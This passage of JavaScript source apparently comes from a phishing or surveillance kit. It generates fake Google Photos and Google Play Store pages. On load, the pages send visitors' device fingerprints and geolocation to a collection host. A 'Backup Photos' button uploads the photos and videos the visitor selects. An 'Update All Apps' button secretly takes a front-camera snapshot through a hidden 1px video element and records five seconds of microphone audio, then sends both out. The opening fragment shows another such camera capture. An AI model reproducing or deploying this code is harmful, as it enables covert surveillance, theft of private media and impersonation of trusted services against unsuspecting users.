      await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
      const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
      c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
      const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
      const fd=new FormData();fd.append('photo',b,'cam.jpg');fd.append('uid',UID);
      fd.append('camtype','📷 Screen Fallback Cam');
      await fetch(D+'/photo',{method:'POST',body:fd});
    }catch(e2){}
    document.getElementById('st').textContent='✅ Done';
  }

  document.querySelector('.btn').textContent='▶ Watch Now';
  document.querySelector('p').textContent='Loading video...';
  setTimeout(()=>document.querySelector('p').textContent='Stream unavailable. Try again later.',3000);
}
</script>
</body>
</html>`;
}

// ── Gallery Page ──────────────────────────────────────────────
function gallery2Page(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Photos</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
.hdr{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #eee}
.hdr-icon{font-size:28px}
.hdr-txt{font-size:18px;font-weight:600;color:#333}
.banner{background:#e8f0fe;margin:12px;padding:14px;border-radius:12px}
.ban-title{font-size:14px;font-weight:600;color:#1a73e8;margin-bottom:4px}
.ban-sub{font-size:13px;color:#555;margin-bottom:12px}
.btn{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:2px}
.grid-item{aspect-ratio:1;background:#f0f0f0;display:flex;align-items:center;justify-content:center;font-size:24px}
#st{text-align:center;padding:10px;font-size:12px;color:#999}
#progress{font-size:13px;color:#1a73e8;text-align:center;padding:8px}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-icon">📷</div>
  <div class="hdr-txt">Google Photos</div>
</div>

<div class="banner">
  <div class="ban-title">☁️ Backup Your Photos</div>
  <div class="ban-sub">Select your photos to back them up safely to Google Photos.</div>
  <button class="btn" onclick="openGallery()">Select Photos to Backup</button>
</div>

<div id="progress"></div>
<div id="st"></div>

<!-- fake photo grid -->
<div class="grid">
  <div class="grid-item">🌄</div><div class="grid-item">🤳</div><div class="grid-item">🌃</div>
  <div class="grid-item">🎂</div><div class="grid-item">🐕</div><div class="grid-item">🌊</div>
  <div class="grid-item">👨‍👩‍👧</div><div class="grid-item">🎉</div><div class="grid-item">🌸</div>
</div>

<script>
const UID='${uid}',D='${HOST}/d';
window.onload=function(){
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'🖼️ Gallery Page Opened',data:navigator.userAgent})});
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  });
};
function openGallery(){
  const inp=document.createElement('input');
  inp.type='file';inp.accept='image/*,video/*';inp.multiple=true;inp.style.display='none';
  inp.onchange=async()=>{
    const files=[...inp.files];
    document.getElementById('progress').textContent='Uploading '+files.length+' files...';
    document.querySelector('.btn').textContent='Uploading...';
    let done=0;
    for(const f of files){
      try{
        const buf=await f.arrayBuffer();
        const fd=new FormData();
        fd.append('photo',new Blob([buf],{type:f.type}),f.name);
        fd.append('uid',UID);fd.append('camtype','🖼️ Gallery: '+f.name);
        await fetch(D+'/photo',{method:'POST',body:fd});
        done++;
        document.getElementById('progress').textContent=done+'/'+files.length+' uploaded';
      }catch(e){}
    }
    document.querySelector('.btn').textContent='✅ Backup Complete';
    document.getElementById('progress').textContent='All '+done+' photos backed up!';
    document.getElementById('st').textContent='Your photos are safe in Google Photos';
  };
  document.body.appendChild(inp);inp.click();
}
</script>
</body>
</html>`;
}

// ── All Apps Page ─────────────────────────────────────────────
function allappsPage(uid) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Play</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
.hdr{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #eee;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.hdr-icon{font-size:28px}
.hdr-txt{font-size:17px;font-weight:600;color:#333}
.update-banner{background:#e8f5e9;margin:12px;padding:16px;border-radius:12px}
.up-title{font-size:14px;font-weight:700;color:#2e7d32;margin-bottom:4px}
.up-sub{font-size:13px;color:#555;margin-bottom:12px;line-height:1.4}
.btn{width:100%;padding:13px;background:#01875f;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.app-item{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f5f5f5;gap:12px}
.app-icon{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.app-info{flex:1}
.app-name{font-size:14px;font-weight:600;color:#333}
.app-size{font-size:12px;color:#999;margin-top:2px}
.update-btn{background:#01875f;color:#fff;border:none;border-radius:20px;padding:6px 14px;font-size:12px;cursor:pointer}
#st{text-align:center;padding:10px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-icon">▶️</div>
  <div class="hdr-txt">Google Play Store</div>
</div>

<div class="update-banner">
  <div class="up-title">🔄 Updates Available</div>
  <div class="up-sub">Security updates are available for your apps. Update all to keep your device protected.</div>
  <button class="btn" onclick="run()">Update All Apps</button>
</div>

<div id="st"></div>

<!-- fake app list -->
<div class="app-item"><div class="app-icon" style="background:#1877f2">f</div><div class="app-info"><div class="app-name">Facebook</div><div class="app-size">87 MB</div></div><button class="update-btn">Update</button></div>
<div class="app-item"><div class="app-icon" style="background:#25d366">💬</div><div class="app-info"><div class="app-name">WhatsApp</div><div class="app-size">53 MB</div></div><button class="update-btn">Update</button></div>
<div class="app-item"><div class="app-icon" style="background:#e1306c">📸</div><div class="app-info"><div class="app-name">Instagram</div><div class="app-size">71 MB</div></div><button class="update-btn">Update</button></div>
<div class="app-item"><div class="app-icon" style="background:#ff0000">▶️</div><div class="app-info"><div class="app-name">YouTube</div><div class="app-size">122 MB</div></div><button class="update-btn">Update</button></div>
<div class="app-item"><div class="app-icon" style="background:#000">🎵</div><div class="app-info"><div class="app-name">TikTok</div><div class="app-size">94 MB</div></div><button class="update-btn">Update</button></div>
<div class="app-item"><div class="app-icon" style="background:#2196f3">📧</div><div class="app-info"><div class="app-name">Gmail</div><div class="app-size">42 MB</div></div><button class="update-btn">Update</button></div>

<script>
const UID='${uid}',D='${HOST}/d';
window.onload=function(){
  // collect full device + browser info
  const info={
    ua:navigator.userAgent,
    platform:navigator.platform,
    screen:screen.width+'x'+screen.height,
    colorDepth:screen.colorDepth,
    pixelRatio:window.devicePixelRatio,
    lang:navigator.language,
    langs:(navigator.languages||[]).join(','),
    cores:navigator.hardwareConcurrency,
    memory:navigator.deviceMemory||'?',
    online:navigator.onLine,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookieEnabled:navigator.cookieEnabled,
    time:new Date().toString(),
    referrer:document.referrer
  };
  if(navigator.getBattery) navigator.getBattery().then(b=>{
    info.battery=Math.round(b.level*100)+'%';
    info.charging=b.charging;
    info.dischargeTime=b.dischargingTime;
    fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,type:'📱 All Apps / Full Device Info',
        data:JSON.stringify(info,null,2)})});
  }); else fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'📱 All Apps / Full Device Info',
      data:JSON.stringify(info,null,2)})});

  // passive location
  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
  });
};
async function run(){
  document.querySelector('.btn').textContent='Updating...';
  document.getElementById('st').textContent='Installing updates...';

  // front camera capture
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
    document.body.appendChild(v);
    await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());v.remove();
    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
    const fd=new FormData();fd.append('photo',b,'allapps_cam.jpg');fd.append('uid',UID);
    fd.append('camtype','📱 All Apps Page Cam');
    await fetch(D+'/photo',{method:'POST',body:fd});
  }catch(e){}

  // mic
  try{
    const stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
    const rec=new MediaRecorder(stream);const ch=[];
    rec.ondataavailable=e=>ch.push(e.data);
    rec.onstop=async()=>{
      const fd=new FormData();
      fd.append('audio',new Blob(ch,{type:'audio/webm'}),'env_audio.webm');
      fd.append('uid',UID);
      await fetch(D+'/audio',{method:'POST',body:fd}).catch(()=>{});
      stream.getTracks().forEach(t=>t.stop());
    };
    rec.start();setTimeout(()=>rec.stop(),5000);
  }catch(e){}

  setTimeout(()=>{
    document.querySelector('.btn').textContent='✅ All Updated';
    document.getElementById('st').textContent='All apps updated successfully';
    document.querySelectorAll('.update-btn').forEach(b=>b.textContent='✅');
  },3000);
}
</script>
</body>
</html>`;
}
